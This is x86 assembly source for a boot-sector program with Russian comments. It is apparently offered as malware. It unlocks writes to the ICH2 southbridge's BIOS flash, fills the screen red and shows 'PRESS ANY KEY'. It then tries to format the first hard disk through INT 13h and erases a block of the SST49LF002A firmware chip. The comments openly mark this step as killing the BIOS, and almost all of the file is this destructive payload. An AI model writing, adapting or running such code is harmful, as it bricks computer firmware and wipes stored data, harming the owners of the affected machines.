format binary
use16
org 7c00h

start:
;----------------------------------------------------|
;Инициализация сегментных регистров и установка стека|
;----------------------------------------------------|
			cli

			mov ax, cs
			mov ds, ax
			mov ss, ax
			mov sp, start

			sti

;----------------------------------------------------|
;Пока мы в 16 битах, перепрограммируем южный мост для|
;записи в LPC BIOS Flash ROM (ICH2)			   |
;----------------------------------------------------|
			xor cx, cx
			mov di, 04Eh	      ; BIOS_CNTL Register
			call readBytePCIBIOS
			or cl, 1
			call writeBytePCIBIOS

			mov di, 0e3h	      ; FWH_DEC_EN1 Register
			call readBytePCIBIOS
			or cl, 0ffh
			call writeBytePCIBIOS

			mov di, 0f0h	      ; FWH_DEC_EN2 Register
			call readBytePCIBIOS
			or cl, 0fh
			call writeBytePCIBIOS

			mov ax, 0b800h
			mov es, ax
			mov ah, 40h
			mov al, 0
			mov di, 0
red:			mov word ptr es:di, ax
			add di, 2
			cmp di, 4000
			jnz red
			mov si, kill		    ;PRESS ANY KEY
			call print

			xor ax, ax		  ; ждем нашу any key
			int 16h

			mov dl, 80h
			mov dh, 1
			mov cx, 100h	      ; пробуем форматировать диск (может не получиться)
			mov ah, 7
			mov al, 0
			int 13h

			cli

			; Запретить немаскируемые прерывания (NMI)

			in al, 70h
			or al, 80h
			out 70h, al

			; A20

			in al, 92h
			or al, 2
			out 92h, al

			lgdt [cs:GDTR]
			; перейти в защищенный режим
			mov eax,cr0
			or al,1
			mov cr0,eax

			jmp CODE_SELECTOR:start_PM

			use32
			start_PM:

			mov eax,DATA_SELECTOR
			mov ds,ax
			mov fs,ax
			mov gs,ax
			mov es,ax
			mov eax,STACK_SELECTOR
			mov ss, ax
			mov ebx,0h
			mov esp, ebx
			mov eax,cr0
			and al,0FEh
			mov cr0,eax
			jmp 0:exit_PM
			use16
			exit_PM:
			; записать что-нибудь в каждый сегментный регистр
			xor ax,ax
			mov ss,ax
			mov sp,7C00h
			mov ds,ax
			mov es,ax
			mov fs,ax
			mov gs,ax
			mov ax,cs
			mov ds,ax

			; Разрешить немаскируемые прерывания (NMI)

			in al, 70h
			and al, 7fh
			out 70h, al

;---------------------------------------|
;Самое подходящее время для смерти BIOS |
;---------------------------------------|

			jmp del_bios
del_bios:
			sti
			use32

			; Block 14 SST49LF002A
			mov eax, 0FFBF0002h
			mov ecx, 38000h

			cli

			call 0:blockLR
			call 0:eraseBlockFlashBIOS

			; Добавить еще немного блоков по желанию
			use16
			hlt
			jmp $


print:
			push ax
			push di
			mov di, word ptr pos
			mov ax, 0b800h
			mov es, ax
			mov ah, 4fh
			.loop:
			lodsb
			test al, al
			jz .quit
			mov [es:di],ax
			add di,2
			jmp .loop
			.quit:
			add word ptr pos,160
			pop di
			pop ax

			ret

readBytePCIBIOS:
			push bx
			mov ax, 0b108h
			xor bh, bh
			mov bl, 0f8h
			int 1ah
			pop bx

			ret

writeBytePCIBIOS:
			push bx
			mov ax, 0b10bh
			xor bh, bh
			mov bl, 0f8h
			int 1ah
			pop bx

			ret

eraseBlockFlashBIOS:
			use32
			;mov edi, 0b8000h
			;mov ax, 5403h		     ;DEBUG
			;mov [es:edi], ax

			mov eax, 35555h
			mov ebx, 32AAAh
			mov byte ptr eax, bl
			mov byte ptr ebx, al
			mov byte ptr eax, 80h
			mov byte ptr eax, bl
			mov byte ptr ebx, al
			mov byte ptr ecx, 50h
			loop $
			retf

blockLR:
			use32

			mov bh, byte ptr eax
			and bh, 0FEh
			mov byte ptr eax, bh

			retf


CODE_SELECTOR = 8h
DATA_SELECTOR = 10h
STACK_SELECTOR = 18h

GDTR:			; Global Descriptors Table Register
  dw 4*8-1		; Размер GDT
  dd GDT		; Смещение GDT

GDT:
; нулевой дескриптор
NULL_descr	db  8 dup (0)
; дескриптор сегмента кода (32 бита, база 0h, лимит 0ffffffffh, granularity = 1)
CODE_descr	db  0FFh, 0FFh, 00h, 00h, 00h, 10011010b, 11001111b , 00h
; дескриптор сегмента данных (32 бита, база 0h, лимит 0ffffffffh, granularity = 1, R\W)
DATA_descr	db  0FFh, 0FFh, 00h, 00h, 00h, 10010010b, 11001111b , 00h
; дескриптор сегмента данных (стека) (16 бит, база 0h, лимит 0ffffh, granularity = 0, R\W)
STACK_descr	 db  0FFh, 0FFh, 00h, 00h, 00h, 10010010b, 00000000b , 00h

pos: dw 0
kill: db "PRESS ANY KEY", 0
times 510-($- $$) db 0
db 55h, 0AAh